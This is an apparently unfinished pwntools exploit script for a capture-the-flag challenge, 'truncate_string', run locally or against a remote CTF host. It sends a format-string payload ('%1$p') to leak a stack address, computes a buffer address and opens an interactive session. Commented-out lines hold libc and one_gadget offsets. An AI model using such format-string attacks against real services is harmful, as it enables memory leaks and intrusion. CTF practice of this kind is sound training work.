#coding:utf-8
import sys
from pwn import *
# context.log_level='debug'
context.arch='amd64'
global i
i=0
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./truncate_string')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			# elf=ELF('./truncate_string')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('nc.eonew.cn',10012)
			# elf=ELF('./truncate_string')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		

		pay='%1$p'
		io.sendline(pay)
		buf_addr=int(io.recvline(),16)-(43-8)*8
		

		


		
		io.sendline(pay)
		io.recv()


		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	i+=1
	# 	io.close()
	# 	continue
	# else:
	# 	continue